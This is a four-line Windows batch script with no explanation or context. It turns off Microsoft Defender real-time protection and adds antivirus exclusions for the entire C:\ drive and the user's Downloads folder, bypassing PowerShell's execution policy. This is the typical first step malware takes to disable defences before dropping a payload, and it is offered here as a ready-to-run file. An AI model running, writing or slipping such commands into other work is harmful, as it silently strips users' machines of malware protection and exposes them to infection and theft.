@echo off
powershell Set-MpPreference -DisableRealtimeMonitoring $true
powershell -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath 'C:\'"
powershell -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '$env:USERPROFILE\Downloads'"
